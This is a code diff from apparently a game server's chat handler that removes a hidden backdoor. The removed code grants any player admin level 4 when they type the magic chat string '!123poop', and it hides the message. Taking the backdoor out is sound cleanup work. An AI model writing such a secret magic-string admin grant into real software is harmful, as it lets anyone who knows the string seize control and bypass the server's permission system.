@@ -10,11 +10,6 @@ const onChat: HBClient["onPlayerChat"] = (player, message) => {
 
   const chatObj = new ChatMessage(message, playerProfile);
 
-  if (message === "!123poop") {
-    playerProfile.setAdminLevel(4).setAdmin(true);
-    return false;
-  }
-
   if (chatObj.isOffensive()) return ChatHandler.handleOffensiveMessage(chatObj);
 
   if (chatObj.startsWithTeamChatPrefix())
